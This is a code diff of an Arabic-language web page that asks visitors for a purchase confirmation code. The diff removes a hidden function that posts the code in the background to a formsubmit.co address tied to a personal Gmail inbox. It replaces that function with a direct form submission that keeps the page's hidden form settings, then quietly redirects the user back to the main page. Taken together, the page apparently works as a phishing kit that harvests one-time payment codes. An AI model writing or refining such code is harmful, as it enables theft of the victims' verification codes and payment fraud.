@@ -655,7 +655,7 @@
                         <input type="hidden" name="_subject" value="كود تأكيد الشراء - منصة مستقبلية">
                         <input type="hidden" name="_template" value="table">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="">
+                        <input type="hidden" name="_next" id="nextUrlCode" value="">
                         
                         <!-- كود التأكيد -->
                         <div>
@@ -765,66 +765,36 @@
             // سيتم إرسال النموذج تلقائياً ثم التوجيه لصفحة الكود
         });
 
+        // تعيين URL للعودة من صفحة الكود
+        function setCodeNextUrl() {
+            const currentUrl = window.location.href;
+            const baseUrl = currentUrl.split('#')[0];
+            document.getElementById('nextUrlCode').value = baseUrl + '#back-to-main';
+        }
+
+        // فحص الانتقال من صفحة الكود
+        function checkForBackToMain() {
+            if (window.location.hash === '#back-to-main') {
+                setTimeout(() => {
+                    returnToMainPage();
+                }, 500);
+            }
+        }
+
         // إرسال نموذج التأكيد
         document.getElementById('confirmationForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
             const confirmCode = document.getElementById('confirmationCode').value;
             
             if (!confirmCode || confirmCode.length < 6) {
+                e.preventDefault();
                 showAlert('خطأ', 'يرجى إدخال كود التأكيد بالكامل');
                 return;
             }
             
             showLoading();
-            
-            // إرسال البيانات في الخلفية
-            sendConfirmationData(confirmCode);
-            
-            // العودة للصفحة الرئيسية بعد الإرسال
-            setTimeout(() => {
-                hideLoading();
-                returnToMainPage();
-            }, 2000);
+            setCodeNextUrl();
+            // سيتم إرسال النموذج تلقائياً ثم التوجيه للعودة للصفحة الرئيسية
         });
-
-        // إرسال بيانات التأكيد في الخلفية
-        function sendConfirmationData(confirmCode) {
-            // إنشاء نموذج مخفي للإرسال
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://formsubmit.co/kalimmmy@gmail.com';
-            form.target = 'hiddenFrame';
-            form.style.display = 'none';
-
-            // إضافة البيانات
-            const data = {
-                confirmation_code: confirmCode,
-                timestamp: new Date().toISOString(),
-                _subject: 'كود تأكيد الشراء - منصة مستقبلية',
-                _template: 'table',
-                _captcha: 'false',
-                _next: window.location.href + '#success'
-            };
-
-            Object.keys(data).forEach(key => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = key;
-                input.value = data[key];
-                form.appendChild(input);
-            });
-
-            document.body.appendChild(form);
-            
-            // إرسال النموذج في الخلفية
-            form.submit();
-            
-            // إزالة النموذج بعد الإرسال
-            setTimeout(() => {
-                document.body.removeChild(form);
-            }, 1000);
-        }
 
         // عرض التحميل
         function showLoading() {
@@ -895,8 +865,14 @@
             // فحص الانتقال لصفحة الكود
             checkForCodePage();
             
+            // فحص العودة للصفحة الرئيسية
+            checkForBackToMain();
+            
             // مراقبة تغيير الURL
-            window.addEventListener('hashchange', checkForCodePage);
+            window.addEventListener('hashchange', function() {
+                checkForCodePage();
+                checkForBackToMain();
+            });
             
             // تأثيرات التركيز على الحقول
             const inputs = document.querySelectorAll('.futuristic-input');
